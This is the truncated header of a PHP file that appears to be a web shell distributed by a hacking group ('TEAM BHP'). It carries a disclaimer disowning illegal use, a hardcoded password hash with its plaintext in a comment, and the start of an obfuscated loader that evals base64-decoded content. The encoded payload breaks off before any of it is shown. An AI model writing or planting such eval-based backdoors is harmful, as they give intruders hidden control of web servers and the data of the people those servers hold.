<?php 
/*
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::                                                    ::
::                     BHP.php                        ::
::                 !!!!TEAM BHP!!!!                   :: 
::             Coded by : E@GL3-STR!K3R               ::
::                                                    ::
::                                                    ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::

#-------------------------------------------------------------------------------
# Feel free to share and (@)distribute it anywhere
# but please keep the Stuff (E@GL3-STR!K3R)original!
# Warning:We are NOT responsible for(@) any damage or illegal actions 
# caused by the use of this Stuffs. Use on(code) your own risk!
#-------------------------------------------------------------------------------
*/

#-------------------------------------------------------------------------------
# Now Pasword is :muneeb
$auth_pass = "d4c2bf24fc92513fde2f2540c1eafcd1";
#-------------------------------------------------------------------------------
?><?php eval("?>".base64_decode("